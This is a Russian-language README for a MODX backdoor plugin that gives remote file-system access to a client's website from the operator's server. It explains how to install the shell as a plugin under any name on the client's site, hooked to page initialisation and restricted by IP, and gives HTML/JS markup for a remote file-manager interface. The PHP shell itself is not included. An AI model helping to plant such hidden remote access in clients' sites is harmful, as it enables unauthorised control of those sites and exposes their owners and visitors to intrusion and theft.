## Описание

Это маленький бэкдор позволяющий получить доступ к файловой системе сайта со своего сервера с защитой пр IP используйте на свой страх и риск, а лучше вообще не используйте, доверяйте своим клиентам

## Установка rest сервера

Создайте у клиента плагин под любым названием, скопируйте в него содержимое файла **shell/plugin/shell.php** установите событие **OnWebPageInit** и в переменной **$servIp** укажите ip адрес клиента, с которого будем обращаться в дальнейшем

## Установка клиента

В своей CRM (или где нибудь еще) подключите 2 библиотеки и наш css файл со скриптом:

	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
	<script src="js/main.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.2.8/ace.js"></script>
	<link rel="stylesheet" href="css/main.css">

Далее разместите разметку:

	<form class="sentShell">
	  <input type="text" name="url" value="https://chistokitchen.ru/" placeholder="URL">
	  <select name="cmd">
	    <option value="dir" selected>Файловый менеджер</option>
	  </select>
	  <input type="text" name="dir" value="/" placeholder="DIR">
	  <button>Отправить</button>
	</form>
	<div class="result-block">
	  <div id="absolute"><b>Абсолютный путь: </b> <span></span></div>
	  <div id="base"><b>Корень MODX: </b> <span></span></div>
	  <div id="dir"><b>Текущая директория: </b> <span></span></div>
	  <div id="resp">
	    <div class="loader"></div>
	    <h3>Директории</h3>
	    <div id="back">Назад</div>
	    <ul>
	      
	    </ul>
	  </div>
	  <div class="resp-file-block">
	    <div class="loader"></div>
	    <h3>Содержимое файла</h3>
	    <div>
	      Язык файла: 
	      <select id="ace-mode">
	        <option value="php" selected>PHP</option>
	        <option value="HTML">HTML</option>
	        <option value="SASS">SASS</option>
	        <option value="CSS">CSS</option>
	      </select>
	    </div>
	    <div id="resp-file"></div>
	  </div>
	  
	</div>

Вот и все, можете пользоваться